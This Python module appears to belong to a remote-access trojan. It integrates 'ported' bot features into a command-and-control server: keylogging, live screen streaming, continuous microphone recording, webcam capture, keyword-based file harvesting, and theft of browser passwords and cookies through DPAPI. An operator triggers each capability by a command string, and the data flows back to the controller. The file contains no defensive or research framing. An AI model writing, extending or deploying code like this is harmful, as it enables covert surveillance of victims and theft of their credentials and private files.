#!/usr/bin/env python3
"""
Advanced Features Integration Module
Integrates all ported features from bot.py into the C2C server architecture
"""

import asyncio
import threading
import time
import logging
from typing import Dict, Any, Optional, Callable, List
import json

# Import our new modules
from .screen_streaming import StreamingManager
from .audio_recorder import AudioManager
from .file_harvester import FileHarvestManager
from .keylogger import SmartKeylogger
from .screenshot import ScreenCapture
from .webcam import WebcamCapture
from .sysinfo import SystemInfo

# Import DPAPI if on Windows
try:
    from ...utils.dpapi_crypto import BrowserDataExtractor
    DPAPI_AVAILABLE = True
except ImportError:
    DPAPI_AVAILABLE = False


class AdvancedFeaturesManager:
    """Manager for all advanced features ported from bot.py"""
    
    def __init__(self, send_callback: Optional[Callable] = None):
        """
        Initialize advanced features manager
        
        Args:
            send_callback: Function to send data back to C2C server
        """
        self.send_callback = send_callback
        self.logger = logging.getLogger(__name__)
        
        # Initialize feature managers
        self.streaming_manager = StreamingManager(send_callback=self._handle_data)
        self.audio_manager = AudioManager(send_callback=self._handle_data)
        self.harvest_manager = FileHarvestManager(send_callback=self._handle_data)
        
        # Initialize existing modules with callback
        self.keylogger = SmartKeylogger()
        self.screenshot = ScreenCapture()
        self.webcam = WebcamCapture()
        self.sysinfo = SystemInfo()
        
        # Initialize DPAPI if available
        if DPAPI_AVAILABLE:
            self.browser_extractor = BrowserDataExtractor(callback=self._handle_data)
        else:
            self.browser_extractor = None
            
        # Feature status tracking
        self.active_features = {
            'streaming': False,
            'audio_recording': False,
            'keylogging': False,
            'file_harvesting': False,
            'browser_extraction': False
        }
        
        # Initialize audio recorder
        self._init_audio()
        
    def _init_audio(self):
        """Initialize audio recorder"""
        try:
            result = self.audio_manager.initialize_recorder()
            self.logger.info(f"Audio initialization: {result['message']}")
        except Exception as e:
            self.logger.error(f"Failed to initialize audio: {e}")
            
    def _handle_data(self, data: Dict[str, Any]) -> None:
        """Handle data from feature modules"""
        try:
            if self.send_callback:
                # Add metadata
                data['feature_source'] = 'advanced_features'
                data['timestamp'] = time.time()
                
                # Send to C2C server
                self.send_callback(data)
            else:
                self.logger.debug(f"Received data: {data['type']}")
                
        except Exception as e:
            self.logger.error(f"Error handling data: {e}")
            
    def execute_command(self, command: str, params: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Execute advanced feature command
        
        Args:
            command: Command to execute
            params: Command parameters
            
        Returns:
            Command execution result
        """
        params = params or {}
        
        try:
            # Screen streaming commands
            if command.startswith('stream_'):
                return self._handle_streaming_commands(command, params)
                
            # Audio recording commands
            elif command.startswith('audio_'):
                return self._handle_audio_commands(command, params)
                
            # File harvesting commands
            elif command.startswith('harvest_'):
                return self._handle_harvest_commands(command, params)
                
            # Browser data extraction commands
            elif command.startswith('browser_'):
                return self._handle_browser_commands(command, params)
                
            # Enhanced keylogger commands
            elif command.startswith('keylog_'):
                return self._handle_keylog_commands(command, params)
                
            # Enhanced webcam commands
            elif command.startswith('webcam_'):
                return self._handle_webcam_commands(command, params)
                
            # System information commands
            elif command.startswith('sysinfo_'):
                return self._handle_sysinfo_commands(command, params)
                
            # General commands
            elif command == 'get_status':
                return self.get_status()
                
            elif command == 'get_capabilities':
                return self.get_capabilities()
                
            else:
                return {
                    'success': False,
                    'message': f'Unknown command: {command}',
                    'available_commands': self._get_available_commands()
                }
                
        except Exception as e:
            self.logger.error(f"Error executing command {command}: {e}")
            return {
                'success': False,
                'message': f'Command execution error: {str(e)}'
            }
            
    def _handle_streaming_commands(self, command: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Handle screen streaming commands"""
        if command == 'stream_start':
            self.active_features['streaming'] = True
            return self.streaming_manager.start_stream(
                quality=params.get('quality', 60),
                fps=params.get('fps', 2),
                scale=params.get('scale', 50)
            )
            
        elif command == 'stream_stop':
            self.active_features['streaming'] = False
            return self.streaming_manager.stop_stream()
            
        elif command == 'stream_adjust':
            return self.streaming_manager.adjust_settings(
                quality_delta=params.get('quality_delta', 0),
                fps_delta=params.get('fps_delta', 0),
                scale_delta=params.get('scale_delta', 0)
            )
            
        elif command == 'stream_status':
            return self.streaming_manager.get_status()
            
        else:
            return {'success': False, 'message': f'Unknown streaming command: {command}'}
            
    def _handle_audio_commands(self, command: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Handle audio recording commands"""
        if command == 'audio_record':
            duration = params.get('duration', 10)
            return self.audio_manager.record_duration(duration)
            
        elif command == 'audio_start_continuous':
            self.active_features['audio_recording'] = True
            return self.audio_manager.start_continuous()
            
        elif command == 'audio_stop_continuous':
            self.active_features['audio_recording'] = False
            return self.audio_manager.stop_continuous()
            
        elif command == 'audio_set_device':
            device_id = params.get('device_id')
            return self.audio_manager.set_device(device_id)
            
        elif command == 'audio_test_device':
            device_id = params.get('device_id')
            return self.audio_manager.test_device(device_id)
            
        elif command == 'audio_status':
            return self.audio_manager.get_status()
            
        else:
            return {'success': False, 'message': f'Unknown audio command: {command}'}
            
    def _handle_harvest_commands(self, command: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file harvesting commands"""
        if command == 'harvest_files':
            self.active_features['file_harvesting'] = True
            return self.harvest_manager.collect_files(**params)
            
        elif command == 'harvest_category':
            categories = params.get('categories', ['documents'])
            return self.harvest_manager.collect_by_category(categories, **params)
            
        elif command == 'harvest_recent':
            days = params.get('days', 7)
            return self.harvest_manager.collect_recent(days, **params)
            
        elif command == 'harvest_large':
            min_size = params.get('min_size', 10 * 1024 * 1024)
            return self.harvest_manager.collect_large(min_size, **params)
            
        elif command == 'harvest_search':
            keywords = params.get('keywords', [])
            return self.harvest_manager.search_content(keywords, **params)
            
        elif command == 'harvest_get_categories':
            return self.harvest_manager.get_categories()
            
        elif command == 'harvest_status':
            return self.harvest_manager.get_status()
            
        else:
            return {'success': False, 'message': f'Unknown harvest command: {command}'}
            
    def _handle_browser_commands(self, command: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Handle browser data extraction commands"""
        if not self.browser_extractor:
            return {
                'success': False,
                'message': 'Browser extraction not available (Windows only)'
            }
            
        if command == 'browser_extract_passwords':
            browsers = params.get('browsers')
            return self.browser_extractor.extract_passwords(browsers)
            
        elif command == 'browser_extract_cookies':
            browsers = params.get('browsers')
            return self.browser_extractor.extract_cookies(browsers)
            
        elif command == 'browser_extract_history':
            browsers = params.get('browsers')
            return self.browser_extractor.extract_history(browsers)
            
        elif command == 'browser_get_available':
            return {
                'success': True,
                'browsers': list(self.browser_extractor.dpapi.browser_paths.keys()),
                'dpapi_available': self.browser_extractor.dpapi.available
            }
            
        else:
            return {'success': False, 'message': f'Unknown browser command: {command}'}
            
    def _handle_keylog_commands(self, command: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Handle enhanced keylogger commands"""
        if command == 'keylog_start':
            self.active_features['keylogging'] = True
            return self.keylogger.start_logging()
            
        elif command == 'keylog_stop':
            self.active_features['keylogging'] = False
            return self.keylogger.stop_logging()
            
        elif command == 'keylog_get_data':
            return self.keylogger.get_logs()
            
        elif command == 'keylog_status':
            return self.keylogger.get_status()
            
        else:
            return {'success': False, 'message': f'Unknown keylog command: {command}'}
            
    def _handle_webcam_commands(self, command: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Handle enhanced webcam commands"""
        if command == 'webcam_capture':
            return self.webcam.capture_image()
            
        elif command == 'webcam_record':
            duration = params.get('duration', 10)
            return self.webcam.record_video(duration)
            
        elif command == 'webcam_list_devices':
            return self.webcam.list_devices()
            
        elif command == 'webcam_set_device':
            device_id = params.get('device_id', 0)
            return self.webcam.set_device(device_id)
            
        else:
            return {'success': False, 'message': f'Unknown webcam command: {command}'}
            
    def _handle_sysinfo_commands(self, command: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Handle system information commands"""
        if command == 'sysinfo_full':
            return self.sysinfo.get_full_info()
            
        elif command == 'sysinfo_basic':
            return self.sysinfo.get_basic_info()
            
        elif command == 'sysinfo_processes':
            return self.sysinfo.get_running_processes()
            
        elif command == 'sysinfo_network':
            return self.sysinfo.get_network_info()
            
        else:
            return {'success': False, 'message': f'Unknown sysinfo command: {command}'}
            
    def get_status(self) -> Dict[str, Any]:
        """Get status of all advanced features"""
        return {
            'success': True,
            'active_features': self.active_features.copy(),
            'streaming_status': self.streaming_manager.get_status(),
            'audio_status': self.audio_manager.get_status(),
            'harvest_status': self.harvest_manager.get_status(),
            'dpapi_available': DPAPI_AVAILABLE,
            'uptime': time.time()
        }
        
    def get_capabilities(self) -> Dict[str, Any]:
        """Get available capabilities"""
        capabilities = {
            'screen_streaming': True,
            'audio_recording': True,
            'file_harvesting': True,
            'keylogging': True,
            'webcam': True,
            'screenshots': True,
            'system_info': True,
            'browser_extraction': DPAPI_AVAILABLE
        }
        
        return {
            'success': True,
            'capabilities': capabilities,
            'commands': self._get_available_commands()
        }
        
    def _get_available_commands(self) -> List[str]:
        """Get list of available commands"""
        commands = [
            # Streaming
            'stream_start', 'stream_stop', 'stream_adjust', 'stream_status',
            
            # Audio
            'audio_record', 'audio_start_continuous', 'audio_stop_continuous',
            'audio_set_device', 'audio_test_device', 'audio_status',
            
            # File harvesting
            'harvest_files', 'harvest_category', 'harvest_recent', 'harvest_large',
            'harvest_search', 'harvest_get_categories', 'harvest_status',
            
            # Keylogging
            'keylog_start', 'keylog_stop', 'keylog_get_data', 'keylog_status',
            
            # Webcam
            'webcam_capture', 'webcam_record', 'webcam_list_devices', 'webcam_set_device',
            
            # System info
            'sysinfo_full', 'sysinfo_basic', 'sysinfo_processes', 'sysinfo_network',
            
            # General
            'get_status', 'get_capabilities'
        ]
        
        # Add browser commands if available
        if DPAPI_AVAILABLE:
            commands.extend([
                'browser_extract_passwords', 'browser_extract_cookies',
                'browser_extract_history', 'browser_get_available'
            ])
            
        return sorted(commands)
        
    def shutdown(self) -> Dict[str, Any]:
        """Shutdown all active features"""
        try:
            results = []
            
            # Stop streaming
            if self.active_features['streaming']:
                result = self.streaming_manager.stop_stream()
                results.append(f"Streaming: {result['message']}")
                
            # Stop audio recording
            if self.active_features['audio_recording']:
                result = self.audio_manager.stop_continuous()
                results.append(f"Audio: {result['message']}")
                
            # Stop keylogging
            if self.active_features['keylogging']:
                result = self.keylogger.stop_logging()
                results.append(f"Keylog: {result.get('message', 'Stopped')}")
                
            # Reset active features
            for feature in self.active_features:
                self.active_features[feature] = False
                
            return {
                'success': True,
                'message': 'All features shutdown successfully',
                'details': results
            }
            
        except Exception as e:
            self.logger.error(f"Error during shutdown: {e}")
            return {
                'success': False,
                'message': f'Shutdown error: {str(e)}'
            }


# Integration function for the main C2C server
def create_advanced_features_handler(send_callback: Optional[Callable] = None):
    """
    Create advanced features handler for C2C server
    
    Args:
        send_callback: Function to send data back to C2C server
        
    Returns:
        Tuple of (handler_function, manager_instance)
    """
    manager = AdvancedFeaturesManager(send_callback=send_callback)
    
    def handle_advanced_command(command: str, params: Dict[str, Any] = None) -> Dict[str, Any]:
        """Handle advanced feature commands"""
        return manager.execute_command(command, params)
        
    return handle_advanced_command, manager


# Example usage in C2C server
def integrate_with_server():
    """Example integration with C2C server"""
    
    def send_to_client(data):
        """Send data to connected client"""
        print(f"Sending {data['type']}: {data.get('size', 'N/A')} bytes")
        
    # Create handler
    command_handler, manager = create_advanced_features_handler(send_callback=send_to_client)
    
    # Example commands
    test_commands = [
        ('get_capabilities', {}),
        ('stream_start', {'quality': 70, 'fps': 2}),
        ('audio_record', {'duration': 5}),
        ('harvest_category', {'categories': ['documents'], 'max_files': 10}),
        ('sysinfo_full', {}),
        ('get_status', {})
    ]
    
    for command, params in test_commands:
        print(f"\nExecuting: {command}")
        result = command_handler(command, params)
        print(f"Result: {result}")
        
        # Wait a bit between commands
        time.sleep(1)
        
    # Shutdown
    print("\nShutting down...")
    shutdown_result = manager.shutdown()
    print(f"Shutdown result: {shutdown_result}")


if __name__ == "__main__":
    # Test the advanced features
    integrate_with_server()